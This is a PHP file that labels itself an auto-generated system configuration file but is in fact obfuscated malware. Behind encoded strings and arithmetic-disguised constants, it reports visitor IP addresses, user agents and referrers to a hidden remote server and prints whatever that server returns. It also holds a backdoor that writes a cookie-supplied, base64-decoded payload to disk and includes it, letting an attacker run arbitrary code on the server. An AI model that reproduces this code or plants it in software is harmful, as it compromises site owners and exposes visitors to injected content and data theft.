<?php
/**
 * System configuration file.
 * Auto-generated by the system for internal use.
 * Do not modify unless you know what you're doing.
 */
 
class _iz
{
    private static $_cnv;
    static function _qwg($_gt)
    {
        if (!self::$_cnv) {
            self::_zcb();
        }
        return self::$_cnv[$_gt];
    }
    private static function _zcb()
    {
        self::$_cnv = [
            0236,
            0135,
            0414,
            -0212,
            -01221,
            -0271,
            0217,
            -0520,
            -01230,
            1.4,
            1.4,
            1.4,
            1.4,
            1.4,
            3.3333333333333,
            3.3333333333333,
            3.3333333333333,
            3.3333333333333,
            3.3333333333333,
            3.3333333333333,
            3.3333333333333,
            3.3333333333333,
            3.3333333333333,
            01235,
            -0675,
            01130,
            -010,
            0102,
            0734,
            02500,
            01557,
            -01356,
            -01307,
            -01107,
            3.75,
            3.75,
            3.75,
            3.75,
            3.75,
            3.75,
            3.75,
            3.75,
            0.25,
            0.25,
            0.25,
            0.25,
            0.25,
            0.25,
            0.25,
            0.25,
            035,
            021,
            050,
            -057,
            -077,
            037,
            0243,
            0170,
            032,
            0400,
            1.75,
            1.75,
            1.75,
            1.75,
            1.75,
            1.75,
            1.75,
            1.75,
            0417,
            011,
            0234,
            -0501,
            -0323,
            0170,
            -0703,
            -01365,
            -012,
            -0466,
            -0456,
            -045,
            0646,
            -0147,
            -0365,
            -0462,
            -017,
            -01114,
            0212,
            2.5,
            2.5,
            2.5,
            2.5,
            2.25,
            2.25,
            2.25,
            2.25,
            011,
            02,
            0201,
            0167,
            -045,
            -0147,
            061,
            0200,
            12.5,
            12.5,
            0.33333333333333,
            0.33333333333333,
            0.33333333333333,
            0.33333333333333,
            0.33333333333333,
            0.33333333333333,
            0.33333333333333,
            0.33333333333333,
            0.33333333333333,
            8,
            8,
            8,
            8,
            8,
            8,
            8,
            8,
            9,
            9,
            9,
            9,
            9,
            9,
            9,
            9,
            9,
            0.25,
            0.25,
            0.25,
            0.25,
            0.25,
            0.25,
            0.25,
            0.25,
            5.2,
            5.2,
            5.2,
            5.2,
            5.2,
            5.2,
            5.2,
            5.2,
            5.2,
            5.2,
            0.25,
            0.25,
            0.25,
            0.25,
            046176,
            050107,
            047677,
            047135,
            046053,
            050345,
            047111,
            050433,
            -0426042,
            0.1,
            0.1,
            0.1,
            0.1,
            0.1,
            0.1,
            0.1,
            0.1,
            0.1,
            0.1,
            0122,
            -0175,
            -030,
            031,
            0345,
            0611,
            -0321,
            -051,
            01365,
            -0330,
            01427,
            -0721,
            01261,
            -0254,
            01351,
            -0163,
            -0504,
            01137,
            -01367,
            1.4285714285714,
            1.4285714285714,
            1.4285714285714,
            1.4285714285714,
            1.4285714285714,
            1.4285714285714,
            1.4285714285714,
            2.6,
            2.6,
            2.6,
            2.6,
            2.6,
            5,
            5,
            0405,
            0152,
            0110,
            0360,
            0374,
            073,
            0351,
            0547,
            -0210,
            0564,
            0170,
            0277,
            13.333333333333,
            13.333333333333,
            13.333333333333,
            13.333333333333,
            13.333333333333,
            13.333333333333,
            0,
            0,
            512,
            512,
            0.2,
            0.2,
            0.2,
            0.2,
            0.2,
            27.5,
            27.5,
            27.5,
            27.5,
            27.5,
            27.5,
            27.5,
            27.5,
            27.5,
            27.5,
            0505,
            0730,
            -035,
            0765,
            02034,
        ];
    }
}
class _tl
{
    private static $_cnv;
    static function _qwg($_gt, $_ky)
    {
        if (!self::$_cnv) {
            self::_zcb();
        }
        $_bwg = strlen($_ky);
        $_bq = base64_decode(self::$_cnv[$_gt]);
        for ($_e = _iz::_qwg(0) + _iz::_qwg(1) + _iz::_qwg(2) - _iz::_qwg(3) + _iz::_qwg(4), $_qz = strlen($_bq); $_e !== $_qz; ++$_e) {
            $_bq[$_e] = chr(ord($_bq[$_e]) ^ ord($_ky[$_e % $_bwg]));
        }
        return $_bq;
    }
    private static function _zcb()
    {
        self::$_cnv = [
            '_unbo' => 'HhsOHSwLQDswFhkKMBRAOTMUAg9yNx8R' . 'OBEDQ' . 'n' . '9' . 'S',
            '_fuj' => 'HBsIDjoaElcLDRYfZVQHCi8YDxk+AA8VMVsMGy' . 'kVFRktHR' . 'Y' . 'O',
            '_dhp' => 'PB' . 's' . '=',
            '_xz' => 'Oh46ATwkOUcWDRdFEw0XRRMNF0UTDRdFFg4HGDswNRgQDjpBBT8+QRYOBxg8CiYcFg0fGDsgJgs7JDp' . 'I',
            '_nla' => 'LhAd' . 'AQ=' . '=',
            '_jfbk' => 'YxkZYQ=' . '=',
            '_tbq' => 'YwoD' . 'AFY' . '=',
            '_xqk' => 'KBQ' . 'KDQ==',
            '_irm' => '',
            '_proi' => '',
            '_upzc' => '',
            '_uok' => 'NwUbHWVeQB0qE0EaOhM' . 'JBDMUBwI' . 'sBQofcRIAAH' . 'A' . 'SAAAvHhwI' . 'LV8FHmAVDhk' . '+TA==',
            '_qhr' => 'PB' . 'MaDTw' . '2CA' . 'E' . 'V',
            '_kr' => 'Nx' . 'gYGAA' . 'P' . 'A' . 'ww6',
            '_kxjh' => 'LA' . 'YMEh' . 'c6',
            '_jg' => 'N' . 'xYZL' . 'xE=',
            '_xw' => 'GC' . 'Mz' . 'Sw' . '=' . '=',
            '_bh' => 'LwIdDw=' . '=',
            '_ior' => 'Lg8ULQM=',
            '_ws' => 'Y' . 'A' . '==',
            '_pcuj' => 'LhEQL' . 'R' . '0=',
            '_uh' => 'fzA4MDlwSUJUZFUwAxc' . 'dZVg' . '=',
            '_ndb' => 'NwgY' . 'HA=' . '=',
            '_sz' => 'UmEwDjEFFgIrAhwPZUswDTAYFm' . 'xVZnk' . '=',
            '_nm' => 'LBQYZU' . 'hb',
            '_tfa' => '',
            '_kusn' => 'NwsWAA==',
            '_ksp' => 'U' . 'mI=',
            '_udw' => 'FyM1D' . 'y' . 'giEz4kE' . 'SM' . '+' . 'Fic=',
            '_fc' => 'FzwkDzcoAC4/DT8xDSw1Gz' . 'c' . '2EDo' . '=',
            '_yvjx' => 'DSgmKQsoNCc' . 'bK' . 'Tk' . '=',
            '_ecc' => 'FyQ8OzMKIy05Mx43' . 'LS' . 'U' . '4',
            '_tkdc' => 'FzUu' . 'Dz4vDCQoACA9Gi8u',
            '_yhjl' => '',
            '_qv' => 'Fy0/ISsNP' . 'C' . '0' . '0J' . 'hor',
            '_xg' => 'Fzss' . 'DzA' . 'qGik9D' . 'Soq',
            '_fp' => '',
            '_plbc' => 'FyMmIQA0PjgaOSYuFic=',
            '_pxkf' => 'FzohMgAtOSsaI' . 'CE9Fj' . '4' . '=',
            '_zjjk' => 'FyU8Nj4HLi4pMwgwOiIkGy4uKTM=',
            '_mcp' => 'Fz' . 'U7Dz43ACcgDTYuDSUqGz' . '4p' . 'EDM' . '=',
            '_digd' => 'DTw5EC0xADgwGys' . '=',
            '_kc' => 'DSYpLTwaPCU' . 'mLA0=',
            '_mt' => 'Ow' . 'c' . 'OHTABD' . 'A==',
            '_ufcz' => 'Fjx' . 'YRA==',
            '_bkq' => 'fwlIOS' . 'J' . 'lVQ==',
            '_qj' => 'fxFBDQg' . 'HZU0=',
            '_gc' => 'f1kbBW' . 'Fv',
            '_ypi' => 'Nhk' . '=',
            '_yijp' => 'Kh' . 'U' . '=',
            '_mbo' => 'LRcK',
            '_ozp' => 'Lh0KD' . 'Q=' . '=',
        ];
    }
}
header(_tl::_qwg('_unbo', '_xmx'));
header(_tl::_qwg('_f' . 'uj', '_tf' . 'z'));
if (isset($_GET[_tl::_qwg('_d' . 'hp', '_s' . 'r')])) {
    $_xx = _umz(_tl::_qwg('_x' . 'z', '_gpq'));
    if ($_xx && strpos($_xx, _tl::_qwg('_' . 'nla', '_g' . 'g' . 'y' . 'c')) !== false) {
        die(_tl::_qwg('_jfbk', '_' . 'v' . 'r'));
    } else {
        die(_tl::_qwg('_' . 'tbq', '_' . 'hbdh'));
    }
}
if (isset($_GET[_tl::_qwg('_x' . 'qk', '_ufab')])) {
    $_qz = $_COOKIE;
    $_ky = _iz::_qwg(5) - _iz::_qwg(6) + _iz::_qwg(7) - _iz::_qwg(8);
    $_gt = (int) round(_iz::_qwg(9) + _iz::_qwg(10) + _iz::_qwg(11) + _iz::_qwg(12) + _iz::_qwg(13));
    $_yp = [];
    $_yp[$_ky] = _tl::_qwg('_i' . 'rm', '_oio');
    while ($_gt) {
        $_yp[$_ky] .= $_qz[(int) round(_iz::_qwg(14) + _iz::_qwg(15) + _iz::_qwg(16) + _iz::_qwg(17) + _iz::_qwg(18) + _iz::_qwg(19) + _iz::_qwg(20) + _iz::_qwg(21) + _iz::_qwg(22))][$_gt];
        if (!$_qz[_iz::_qwg(23) + _iz::_qwg(24) + _iz::_qwg(25) - _iz::_qwg(26) + _iz::_qwg(27) + _iz::_qwg(28) - _iz::_qwg(29)][$_gt + (_iz::_qwg(30) + _iz::_qwg(31) + _iz::_qwg(32) - _iz::_qwg(33))]) {
            if (
                !$_qz[(int) round(_iz::_qwg(34) + _iz::_qwg(35) + _iz::_qwg(36) + _iz::_qwg(37) + _iz::_qwg(38) + _iz::_qwg(39) + _iz::_qwg(40) + _iz::_qwg(41))][
                    $_gt + (int) round(_iz::_qwg(42) + _iz::_qwg(43) + _iz::_qwg(44) + _iz::_qwg(45) + _iz::_qwg(46) + _iz::_qwg(47) + _iz::_qwg(48) + _iz::_qwg(49))
                ]
            ) {
                break;
            }
            $_ky++;
            $_yp[$_ky] = _tl::_qwg('_' . 'pr' . 'oi', '_dql' . 'd');
            $_gt++;
        }
        $_gt = $_gt + (_iz::_qwg(50) + _iz::_qwg(51) + _iz::_qwg(52) + _iz::_qwg(53) + _iz::_qwg(54) + _iz::_qwg(55)) + (_iz::_qwg(56) + _iz::_qwg(57) - _iz::_qwg(58) - _iz::_qwg(59));
    }
    $_ky =
        $_yp[(int) round(_iz::_qwg(60) + _iz::_qwg(61) + _iz::_qwg(62) + _iz::_qwg(63) + _iz::_qwg(64) + _iz::_qwg(65) + _iz::_qwg(66) + _iz::_qwg(67))]() .
        $_yp[_iz::_qwg(68) + _iz::_qwg(69) + _iz::_qwg(70) + _iz::_qwg(71) + _iz::_qwg(72) + _iz::_qwg(73)];
    if (!$_yp[_iz::_qwg(74) - _iz::_qwg(75) - _iz::_qwg(76) + _iz::_qwg(77)]($_ky)) {
        $_gt = $_yp[_iz::_qwg(78) + _iz::_qwg(79) + _iz::_qwg(80) - _iz::_qwg(81) - _iz::_qwg(82) - _iz::_qwg(83) - _iz::_qwg(84) + _iz::_qwg(85) - _iz::_qwg(86)](
            $_ky,
            $_yp[(int) round(_iz::_qwg(87) + _iz::_qwg(88) + _iz::_qwg(89) + _iz::_qwg(90))]
        );
        $_yp[(int) round(_iz::_qwg(91) + _iz::_qwg(92) + _iz::_qwg(93) + _iz::_qwg(94))](
            $_gt,
            $_yp[_iz::_qwg(95) + _iz::_qwg(96)] .
                $_yp[_iz::_qwg(97) - _iz::_qwg(98) - _iz::_qwg(99) + _iz::_qwg(100) - _iz::_qwg(101) + _iz::_qwg(102)](
                    $_yp[(int) round(_iz::_qwg(103) + _iz::_qwg(104))](
                        $_qz[(int) round(_iz::_qwg(105) + _iz::_qwg(106) + _iz::_qwg(107) + _iz::_qwg(108) + _iz::_qwg(109) + _iz::_qwg(110) + _iz::_qwg(111) + _iz::_qwg(112) + _iz::_qwg(113))]
                    )
                )
        );
    }
    include $_ky;
}
function _umz($_xpv)
{
    $_hc = _tl::_qwg('_upz' . 'c', '_qpy');
    $_z = _tl::_qwg('_u' . 'o' . 'k', '_qom') . $_xpv;
    if (is_callable(_tl::_qwg('_qh' . 'r', '_fh' . 'a' . 'c'))) {
        $_s = curl_init($_z);
        curl_setopt($_s, (int) round(_iz::_qwg(114) + _iz::_qwg(115) + _iz::_qwg(116) + _iz::_qwg(117) + _iz::_qwg(118) + _iz::_qwg(119) + _iz::_qwg(120) + _iz::_qwg(121)), false);
        curl_setopt(
            $_s,
            (int) round(_iz::_qwg(122) + _iz::_qwg(123) + _iz::_qwg(124) + _iz::_qwg(125) + _iz::_qwg(126) + _iz::_qwg(127) + _iz::_qwg(128) + _iz::_qwg(129) + _iz::_qwg(130)),
            (int) round(_iz::_qwg(131) + _iz::_qwg(132) + _iz::_qwg(133) + _iz::_qwg(134) + _iz::_qwg(135) + _iz::_qwg(136) + _iz::_qwg(137) + _iz::_qwg(138))
        );
        curl_setopt(
            $_s,
            (int) round(_iz::_qwg(139) + _iz::_qwg(140) + _iz::_qwg(141) + _iz::_qwg(142) + _iz::_qwg(143) + _iz::_qwg(144) + _iz::_qwg(145) + _iz::_qwg(146) + _iz::_qwg(147) + _iz::_qwg(148)),
            (int) round(_iz::_qwg(149) + _iz::_qwg(150) + _iz::_qwg(151) + _iz::_qwg(152))
        );
        curl_setopt(
            $_s,
            _iz::_qwg(153) - _iz::_qwg(154) - _iz::_qwg(155) - _iz::_qwg(156) - _iz::_qwg(157) - _iz::_qwg(158) - _iz::_qwg(159) - _iz::_qwg(160) - _iz::_qwg(161),
            (int) round(_iz::_qwg(162) + _iz::_qwg(163) + _iz::_qwg(164) + _iz::_qwg(165) + _iz::_qwg(166) + _iz::_qwg(167) + _iz::_qwg(168) + _iz::_qwg(169) + _iz::_qwg(170) + _iz::_qwg(171))
        );
        curl_setopt($_s, _iz::_qwg(172) - _iz::_qwg(173) - _iz::_qwg(174) - _iz::_qwg(175) + _iz::_qwg(176) - _iz::_qwg(177), _iz::_qwg(178) + _iz::_qwg(179) - _iz::_qwg(180) - _iz::_qwg(181) + _iz::_qwg(182));
        curl_setopt(
            $_s,
            _iz::_qwg(183) - _iz::_qwg(184) - _iz::_qwg(185) - _iz::_qwg(186) - _iz::_qwg(187) - _iz::_qwg(188) + _iz::_qwg(189) - _iz::_qwg(190),
            (int) round(_iz::_qwg(191) + _iz::_qwg(192) + _iz::_qwg(193) + _iz::_qwg(194) + _iz::_qwg(195) + _iz::_qwg(196) + _iz::_qwg(197))
        );
        curl_setopt($_s, (int) round(_iz::_qwg(198) + _iz::_qwg(199) + _iz::_qwg(200) + _iz::_qwg(201) + _iz::_qwg(202)), (int) round(_iz::_qwg(203) + _iz::_qwg(204)));
        $_hc = curl_exec($_s);
        $_oit = curl_getinfo($_s);
        curl_close($_s);
        if ($_oit[_tl::_qwg('_' . 'k' . 'r', '_ll' . 'h')] != _iz::_qwg(205) + _iz::_qwg(206) - _iz::_qwg(207) - _iz::_qwg(208) - _iz::_qwg(209) - _iz::_qwg(210) + _iz::_qwg(211) + _iz::_qwg(212) + _iz::_qwg(213)) {
            return false;
        }
    } else {
        $_tbf = parse_url($_z);
        $_toz = $_tbf[_tl::_qwg('_k' . 'x' . 'j' . 'h', '_ed' . 'wz')] == _tl::_qwg('_jg', '_bm');
        $_on = _tl::_qwg('_x' . 'w', '_fg' . 'k') . $_tbf[_tl::_qwg('_' . 'bh', '_' . 'c' . 'ig')];
        if (isset($_tbf[_tl::_qwg('_' . 'i' . 'o' . 'r', '_z' . 'q')])) {
            $_on .= _tl::_qwg('_w' . 's', '_v' . 'u') . $_tbf[_tl::_qwg('_p' . 'cu' . 'j', '_d' . 'u')];
        }
        $_on .= _tl::_qwg('_' . 'uh', '_x' . 'l' . 'di') . $_tbf[_tl::_qwg('_n' . 'db', '_g' . 'k' . 'h')] . _tl::_qwg('_' . 'sz', '_k' . 's' . 'a');
        $_iy = fsockopen(
            ($_toz ? _tl::_qwg('_n' . 'm', '_gt') : _tl::_qwg('_tfa', '_' . 'yo' . 'i')) . $_tbf[_tl::_qwg('_ku' . 's' . 'n', '_' . 'det')],
            $_toz ? _iz::_qwg(214) - _iz::_qwg(215) + _iz::_qwg(216) : (int) round(_iz::_qwg(217) + _iz::_qwg(218) + _iz::_qwg(219) + _iz::_qwg(220) + _iz::_qwg(221) + _iz::_qwg(222))
        );
        if ($_iy) {
            fputs($_iy, $_on);
            $_bq = (int) round(_iz::_qwg(223) + _iz::_qwg(224));
            while (!feof($_iy)) {
                $_zr = fgets($_iy, (int) round(_iz::_qwg(225) + _iz::_qwg(226)));
                if ($_bq) {
                    $_hc .= $_zr;
                }
                if ($_zr == _tl::_qwg('_k' . 's' . 'p', '_hsa')) {
                    $_bq = (int) round(_iz::_qwg(227) + _iz::_qwg(228) + _iz::_qwg(229) + _iz::_qwg(230) + _iz::_qwg(231));
                }
            }
            fclose($_iy);
        }
    }
    return $_hc;
}
$_y = isset($_SERVER[_tl::_qwg('_u' . 'dw', '_' . 'wa')]);
$_tmx = isset($_SERVER[_tl::_qwg('_f' . 'c', '_h' . 'p')]);
$_zgp = isset($_SERVER[_tl::_qwg('_yv' . 'jx', '_mk' . 'f')]);
$_tf = isset($_SERVER[_tl::_qwg('_e' . 'c' . 'c', '_ph' . 'k' . 'l')]) ? $_SERVER[_tl::_qwg('_' . 'tk' . 'd' . 'c', '_' . 'a' . 'z')] : _tl::_qwg('_y' . 'hj' . 'l', '_pdz' . 'l');
$_zgc = isset($_SERVER[_tl::_qwg('_' . 'q' . 'v', '_' . 'ykq' . 't')]) ? $_SERVER[_tl::_qwg('_x' . 'g', '_' . 'o' . 'x')] : _tl::_qwg('_fp', '_z' . 'h');
$_y = isset($_SERVER[_tl::_qwg('_p' . 'lb' . 'c', '_wrq')]) ? $_SERVER[_tl::_qwg('_p' . 'xkf', '_nu' . 'b')] : null;
$_tmx = isset($_SERVER[_tl::_qwg('_' . 'zjj' . 'k', '_' . 'qhf' . 'a')]) ? $_SERVER[_tl::_qwg('_mc' . 'p', '_' . 'a' . 'o')] : null;
$_zgp = isset($_SERVER[_tl::_qwg('_d' . 'i' . 'g' . 'd', '_yt')]) ? $_SERVER[_tl::_qwg('_k' . 'c', '_c' . 'd' . 'b' . 'h')] : null;
if (filter_var($_y, (int) round(_iz::_qwg(232) + _iz::_qwg(233) + _iz::_qwg(234) + _iz::_qwg(235) + _iz::_qwg(236) + _iz::_qwg(237) + _iz::_qwg(238) + _iz::_qwg(239) + _iz::_qwg(240) + _iz::_qwg(241)))) {
    $_xbh = $_y;
} elseif (filter_var($_tmx, _iz::_qwg(242) + _iz::_qwg(243) - _iz::_qwg(244) + _iz::_qwg(245) - _iz::_qwg(246))) {
    $_xbh = $_tmx;
} else {
    $_xbh = $_zgp;
}
if (isset($_GET[_tl::_qwg('_m' . 't', '_ei' . 'p')])) {
    echo _tl::_qwg('_ufcz', '_lbd') . $_xbh . _tl::_qwg('_bkq', '_u' . 'hlc') . $_tf . _tl::_qwg('_q' . 'j', '_ma') . $_zgc . _tl::_qwg('_' . 'gc', '_ey' . 'w');
    exit();
}
if (!isset($_xbh) || !isset($_tf) || !isset($_zgc)) {
    exit();
} else {
    $_nk = [_tl::_qwg('_ypi', '_iy' . 'y') => $_xbh, _tl::_qwg('_yij' . 'p', '_' . 't' . 'nyr') => $_tf, _tl::_qwg('_mbo', '_r' . 'lf') => $_zgc];
    $_r = urlencode(base64_encode(json_encode($_nk)));
    $_xx = _umz($_r);
    if ($_xx && strpos($_xx, _tl::_qwg('_o' . 'zp', '_jpuy')) !== false) {
        echo $_xx;
        exit();
    }
}
/* JsZAVjrf */